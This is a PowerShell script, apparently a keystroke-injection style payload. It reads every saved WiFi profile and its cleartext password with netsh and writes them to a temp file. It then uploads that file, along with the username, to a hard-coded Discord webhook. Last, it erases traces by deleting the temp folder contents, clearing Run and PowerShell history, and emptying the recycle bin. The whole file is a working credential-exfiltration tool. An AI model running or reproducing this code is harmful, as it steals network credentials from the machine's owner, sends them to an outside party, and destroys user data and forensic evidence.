#################################################################################################
# Collect WiFi Profiles and Passwords
#################################################################################################

# Extract WiFi profiles and passwords
$wifiProfiles = (netsh wlan show profiles) | 
    Select-String "\:(.+)$" | 
    ForEach-Object {
        $name = $_.Matches.Groups[1].Value.Trim(); $_
    } | 
    ForEach-Object {
        $details = netsh wlan show profile name="$name" key=clear
        $password = ($details | Select-String "Key Content\W+\:(.+)$").Matches.Groups[1].Value.Trim()
        [PSCustomObject]@{ PROFILE_NAME = $name; PASSWORD = $password }
    } | Out-String

# Save WiFi profiles to a temporary file
$wifiFilePath = "$env:TEMP\wifi-pass.txt"
$wifiProfiles | Out-File -Encoding UTF8 $wifiFilePath

#################################################################################################
# Upload to Discord Webhook
#################################################################################################

# Define the Discord webhook URL
$webhookUrl = "https://discord.com/api/webhooks/1299731417290375279/pfX2RVqzHPbZDbdw97pCiSZ9keXRQlRyEul7Wbisgvjw9pbbpLEyr_ZAIXTEQ-VUhbUP"

function Upload-Discord {
    param (
        [string]$filePath,
        [string]$message
    )

    # Prepare JSON body with the username and message
    $body = @{
        'username' = $env:USERNAME
        'content' = $message
    } | ConvertTo-Json

    # Send message to Discord webhook
    Invoke-RestMethod -Uri $webhookUrl -Method Post -ContentType 'application/json' -Body $body

    # Upload the file if provided
    if (-not [string]::IsNullOrEmpty($filePath)) {
        curl.exe -F "file1=@$filePath" $webhookUrl
    }
}

# Upload the WiFi credentials to Discord
Upload-Discord -filePath $wifiFilePath -message "WiFi Credentials Retrieved!"

#################################################################################################
# Clean-Up: Remove Traces
#################################################################################################

function Clean-Exfil {
    # Remove temporary files
    Remove-Item $env:TEMP\* -Force -Recurse -ErrorAction SilentlyContinue

    # Clear Run box history
    reg delete "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" /va /f

    # Clear PowerShell command history
    Remove-Item (Get-PSReadlineOption).HistorySavePath -ErrorAction SilentlyContinue

    # Empty the recycle bin
    Clear-RecycleBin -Force -ErrorAction SilentlyContinue
}

# Run the clean-up function
Clean-Exfil
